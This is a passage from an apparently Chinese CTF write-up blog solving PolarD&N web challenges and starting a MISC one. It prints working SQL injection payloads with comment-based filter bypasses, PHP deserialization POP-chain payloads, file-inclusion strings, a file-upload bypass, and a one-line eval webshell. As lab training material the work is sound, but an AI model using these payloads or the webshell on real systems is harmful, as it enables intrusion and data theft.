class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到filename进行了替换，我们这里用双写绕过，<code>$filename=&quot;flaflagg&quot;</code><br>然后需要触发Day类里面的__toString()方法，Polar类和Night类里面都有echo可以触发，这里我们利用Night类的，因为我们发现了Polar类里有个不知名函数<code>hacker()</code>，可以利用它来触发Night类里面的__call()方法，然后就可以触发__toString()了<br><strong>Polar::__wakeup()-&gt;Night::__call()-&gt;Day::__toString()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Polar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;night = <span class="keyword">new</span> <span class="title class_">Night</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;night_arg = <span class="keyword">new</span> <span class="title class_">Day</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># Tzo1OiJQb2xhciI6Mjp7czo1OiJuaWdodCI7Tzo1OiJOaWdodCI6MTp7czo0OiJuYW1lIjtOO31zOjk6Im5pZ2h0X2FyZyI7TzozOiJEYXkiOjE6e3M6ODoiZmlsZW5hbWUiO3M6OToiL2ZsYWZsYWdnIjt9fQ==</span></span><br></pre></td></tr></table></figure><p>F12查看页面源代码即可</p><h1 id="【WEB】uploader"><a href="#【WEB】uploader" class="headerlink" title="【WEB】uploader"></a>【WEB】uploader</h1><p>好家伙，我没做过这种题emmmm<br>看了wp，需要自己写一个本地表单上传功能，新建一个.html文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- action的链接，是当前题目的上传文件的链接--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ip:port/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>双击该文件，然后在本地上传PHP文件，<code>&lt;?php system(&#39;cat /flag&#39;);?&gt;</code><br>访问路径是，<code>$sandBox.&quot;/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]</code>，即<code>url/$sandBox/filename</code>，$sandBox在本地上传PHP文件后可以看到，因为它被输出了<br>最后F12查看页面源代码即可</p><h1 id="【WEB】search"><a href="#【WEB】search" class="headerlink" title="【WEB】search"></a>【WEB】search</h1><p>一眼SQL注入<br>尝试union注入，<code>1&#39; union select 1,2,3#</code>，多试几个参数都没反应，可能存在过滤，尝试绕过<code>1&#39;/**/Union/**/Select/**/1,2,3#</code>，报错信息<code>Error executing query: The used SELECT statements have a different number of columns</code>，有用<br><code>1&#39;/**/Union/**/Select/**/1,2,3,4,5#</code>，字段数为5的时候有回显<br>爆库名，<code>1&#39;/**/Union/**/Select/**/1,database(),3,4,5#</code>，在第二列，库名为<code>CTF</code><br>爆表名，<code>1&#39;/**/Union/**/Select/**/1,Group_concat(Table_name),3,4,5/**/From/**/Information_schema.tables/**/Where/**/Table_schema=&#39;CTF&#39;#</code>，得到两个表<code>Flag,Students</code><br>爆Flag表的字段名，<code>1&#39;/**/Union/**/Select/**/1,Group_concat(Column_name),3,4,5/**/From/**/Information_schema.columns/**/Where/**/Table_name=&#39;Flag&#39;#</code>，得到<code>Flag</code><br>获取Flag字段内容，<code>1&#39;/**/Union/**/Select/**/1,Group_concat(Flag),3,4,5/**/From/**/Flag#</code></p><p>第二种，报错注入<br><code>1&#39;/**/And/**/Extractvalue(1,Concat(0x7e,User(),0x7e,Database()))#</code>，爆出库名<code>XPATH syntax error: &#39;~root@localhost~CTF&#39;</code><br><code>1&#39;/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Table_name)/**/From/**/Information_schema.tables/**/Where/**/Table_schema=&#39;CTF&#39;)))#</code>，爆出表名<code>XPATH syntax error: &#39;~Flag,Students&#39;</code><br>爆字段名，<code>1&#39;/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Column_name)/**/From/**/Information_schema.columns/**/Where/**/Table_schema=&#39;CTF&#39;/**/And/**/Table_name=&#39;Flag&#39;)))#</code>，得到<code>XPATH syntax error: &#39;~Flag&#39;</code><br>获取值，<code>1&#39;/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Group_concat(Flag)/**/From/**/CTF.Flag)))#</code>，得到<code>XPATH syntax error: &#39;~flag&#123;Polar_CTF_426891370wxbglbn&#39;</code>，可见flag不完整<br>再逆一下，<code>1&#39;/**/And/**/Extractvalue(1,Concat(0x7e,(Select/**/Reverse(Group_concat(Flag))/**/From/**/CTF.Flag)))#</code>，得到完整的flag</p><p>xpath报错注入有extractvalue和updatexml<br>extractvalue参考了Jay 17这位大佬的wp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=1&#x27;/**/and/**/uPdatexmL(1,coNcat(0x7e,(sELect/**/group_cOncat(Flag)/**/frOm/**/CTF.Flag),0x7e),3)#</span><br><span class="line">query=1&#x27;/**/and/**/uPdatexmL(1,coNcat(0x7e,(sELect/**/reverse(group_cOncat(Flag))/**/frOm/**/CTF.Flag),0x7e),3)#</span><br></pre></td></tr></table></figure><p>感觉二者差不多啊，有点细微的差别<br>有点神奇的是，我跟着网上的SQL报错注入，前一个跟着思路走，可以做出来<br>后面一个失败了，然后发现这道题，如果使用updatexml的话，updatexml的字母至少有两个大写字母，emmm为什么，好神奇啊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,User(),0x7e,Database(),0x7e,@@datadir),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Table_name)/**/From/**/Information_schema.tables/**/Where/**/Table_schema=&#x27;CTF&#x27;)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Column_name)/**/From/**/Information_schema.columns/**/Where/**/Table_schema=&#x27;CTF&#x27;/**/And/**/Table_name=&#x27;Flag&#x27;)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Group_concat(Flag)/**/From/**/CTF.Flag)),3)#</span><br><span class="line">1&#x27;/**/And/**/UpdatexmL(1,Concat(0x7e,(Select/**/Reverse(Group_concat(Flag))/**/From/**/CTF.Flag)),3)#</span><br></pre></td></tr></table></figure><h1 id="【WEB】file"><a href="#【WEB】file" class="headerlink" title="【WEB】file"></a>【WEB】file</h1><p>dirsearch一下发现,<code>upload.php和uploaded</code>，一个是文件上传界面，一个是上传的文件保存的地方<br>进行文件上传，此处没有后缀名检查，直接上传PHP文件，但是重发包，修改<code>Content-Type: image/jpeg</code>，没有后缀检查但一般得检查文件内容的类型，改成这样就OK了<br>php文件内容为：<code>&lt;?php system(&quot;cat /flag&quot;);?&gt;</code><br>去uploaded找到php文件，点击即可获得flag<br>以上操作可以不用bp，在火狐浏览器上面也可以操作，算是比较方便<br>同样，也可以选择上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，操作同上，然后拿蚁剑进行连接，最后找flag的时候，直接去根目录下找就OK了</p><h1 id="【WEB】PlayGame"><a href="#【WEB】PlayGame" class="headerlink" title="【WEB】PlayGame"></a>【WEB】PlayGame</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;name:&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;age:&quot;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&quot;sex:&quot;</span>.<span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"><span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$age</span>=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setSex</span>(<span class="params"><span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$sex</span>=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayGame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gameFile</span>=<span class="string">&quot;./game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">openGame</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;gameFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;user-&gt;name.<span class="string">&quot;GameOver!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user-&gt;name.<span class="string">&quot;PlayGame &quot;</span>. <span class="variable language_">$this</span>-&gt;user-&gt;age . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">openGame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;polar_flag.flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;polar_flag.flag&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>我们需要调用openGame()，进行文件的读取，那么我们就要触发PlayGame类的__toString()方法，只有PlayGame类的__destruct()方法可以做到了<br>逻辑还算简单吧，__destruct()-&gt;__toString()-&gt;openGame()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user-&gt;name = <span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;user-&gt;name-&gt;gameFile = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;&#125;s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;&#125;s:8:&quot;gameFile&quot;;s:6:&quot;./game&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>最后注意传参，有效变量名不允许出现下划线和<code>.</code>，我们可以使用<code>[</code>进行处理，即<code>polar[flag.flag</code>，原理好像是PHP将<code>[</code>识别成<code>_</code>，然后后面的错误就直接无视了，即成为了一个有效变量名<br>找到一个解释<code>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_</code><br>题目的PHP版本为7.0.9，传参后F12即可找到flag</p><h1 id="【WEB】csdn"><a href="#【WEB】csdn" class="headerlink" title="【WEB】csdn"></a>【WEB】csdn</h1><p>进入题目，页面没有显示东西，习惯性F12，<code>&lt;!-- 偷偷告诉你,flag在flag目录下的flag.txt中 --&gt;</code>，url:<code>index.php?xxs=https://blog.csdn.net/</code>，感觉考察的是文件包含<br>先试一下普通的文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?xxs=php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag.txt</span></span><br><span class="line">失败</span><br><span class="line">?xxs=file:<span class="comment">///flag.txt</span></span><br><span class="line">成功拿到flag</span><br></pre></td></tr></table></figure><p>PHP伪协议的使用<br><strong>file:&#x2F;&#x2F;协议:访问本地文件系统</strong><br>(flag目录一般在本地目录下)</p><h1 id="【WEB】phar"><a href="#【WEB】phar" class="headerlink" title="【WEB】phar"></a>【WEB】phar</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;funs.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">myWaf</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>有waf，先查看一下<code>funs.php</code>的内容，使用PHP伪协议进行读取<br><code>?file=php://filter/read/convert.base64-encode/resource=funs.php</code><br>base64解码得到：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;f1@g.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myWaf</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f1@g/i&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NONONONON0!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A-&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str_array</span>= <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$str_array</span>[<span class="string">&#x27;kfc&#x27;</span>]-&gt;vm50;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Crazy Thursday&quot;</span>.<span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kfc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c[<span class="variable">$kfc</span>];</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见了变量覆盖<code>var_dump($$f)</code>，让<code>$f=&#39;flag&#39;</code>即可<br><strong>A::__destruct-&gt;B::__toString-&gt;C::__get()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b[<span class="string">&#x27;kfc&#x27;</span>] = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b[<span class="string">&#x27;kfc&#x27;</span>]-&gt;c[<span class="string">&#x27;vm50&#x27;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>此处将private属性全改为public了，或者也可以不修改，最后输出url编码即可(再或者手动补%00类名%00)<br>需要让waf等于False，故file要等于<code>f1@g</code>，payload:<br><code>/?file=f1@g&amp;data=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:1:&#123;s:3:&quot;kfc&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;a:1:&#123;s:4:&quot;vm50&quot;;s:4:&quot;flag&quot;;&#125;&#125;&#125;&#125;&#125;</code><br>又可以像这样，套别的师傅的一个脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A-&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="keyword">array</span>(<span class="string">&quot;kfc&quot;</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">C</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str_array</span>= <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$str_array</span>[<span class="string">&#x27;kfc&#x27;</span>]-&gt;vm50;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Crazy Thursday&quot;</span>.<span class="variable">$str2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">array</span>(<span class="string">&#x27;vm50&#x27;</span>=&gt;<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kfc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c[<span class="variable">$kfc</span>];</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>最后吐槽一下，貌似上次古剑山也出了这样的题，然而古剑山是一场原题杯，还好我没打，但也有所耳闻。。。。</p><h1 id="【WEB】PolarOA"><a href="#【WEB】PolarOA" class="headerlink" title="【WEB】PolarOA"></a>【WEB】PolarOA</h1><p>一个登陆系统，老样子，先抓个包看看，发现cookie里面有东西<br>响应包里可以看到，<code>rememberMe=deleteMe</code><br>发现是shiro反序列化，这算是1.2.4版本的漏洞了<br>有关介绍：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro是常见的Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，就会导致shiro的反序列化漏洞。</span><br><span class="line">返回包存在set-Cookie：rememberMe=deleteMe或URL中有shiro字样。</span><br><span class="line">有时服务器不会主动返回rememberMe=deleteMe，直接发包即可。</span><br><span class="line">Shiro的功能用到了AES加密，但是密码是硬编码在代码里的，所以很容易拿到密钥，因为AES是对称加密，即加密密钥同样是解密密钥，所以就可以通过恶意构建Cookie获取权限执行命令。</span><br><span class="line"></span><br><span class="line">新版本到Shiro 1.2.5及以上版本，就不存在硬编码密钥的问题，而改为自定义密钥。但如果使用了别人的开源框架，他们在代码里配置shiro的密钥，而使用者没有修改shiro的密钥，关键代码可以在github上通过api search接口搜索到，从而得到一个所谓的key包，然后去轮流尝试。</span><br><span class="line"></span><br><span class="line">漏洞分析：</span><br><span class="line"></span><br><span class="line">Apache Shiro默认使用CookieRememberMeManager。其处理cookie的流程是：得到rememberMe的cookie值--&gt;Base64解码--&gt;AES解密--&gt;反序列化。</span><br></pre></td></tr></table></figure><p>嘶，大概了解了，在搞工具，看了官方wp，有点内个了，等我后面补上，咕噜咕噜</p><h1 id="【WEB】Fastjson"><a href="#【WEB】Fastjson" class="headerlink" title="【WEB】Fastjson"></a>【WEB】Fastjson</h1><p>会补吧()，咕噜咕噜</p><h1 id="【MISC】加点儿什么"><a href="#【MISC】加点儿什么" class="headerlink" title="【MISC】加点儿什么"></a>【MISC】加点儿什么</h1><p>binwalk分离图片得到一个cpp文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100</span></span><br><span class="line"><span class="comment">//提示：密文输入372658619JI0707I8G64HF2400F96991 </span></span><br><span class="line"><span class="comment">//提示[1]：代码不是完全准确，需要你加点东西(非常简单) </span></span><br><span class="line"><span class="type">char</span> ciphertext[MAX];    <span class="comment">//密文</span></span><br><span class="line"><span class="type">char</span> plaintext[MAX];     <span class="comment">//明文</span></span><br><span class="line"><span class="type">int</span> K = <span class="number">4</span>;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encryption</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入明文：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">gets_s(plaintext);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;密文为：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; plaintext[i] != <span class="string">&#x27;\0&#x27;</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (plaintext[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; plaintext[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span 